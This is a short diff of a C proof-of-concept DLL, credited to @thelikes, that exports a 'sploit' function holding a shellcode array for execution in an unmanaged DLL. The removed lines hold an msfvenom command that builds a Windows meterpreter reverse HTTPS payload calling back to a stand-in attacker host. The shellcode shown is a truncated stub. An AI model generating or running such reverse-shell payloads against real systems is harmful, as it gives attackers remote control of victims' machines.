@@ -5,12 +5,12 @@
 #include <stdlib.h>
 
 /* POC exec shellcode in unmanaged dll
+ * source: https://github.com/theevilbit/injection
  * @thelikes
  */
 
 extern "C" __declspec(dllexport) void sploit()
 {
-    // msfvenom -p windows/meterpreter/reverse_https LHOST=attkr.com LPORT=443 EXITFUNC=thread -f c -o msf-windows-https.c 
     unsigned char shellcode[] ="\xfc\xe8\x8f\x00";
 
     HANDLE processHandle;
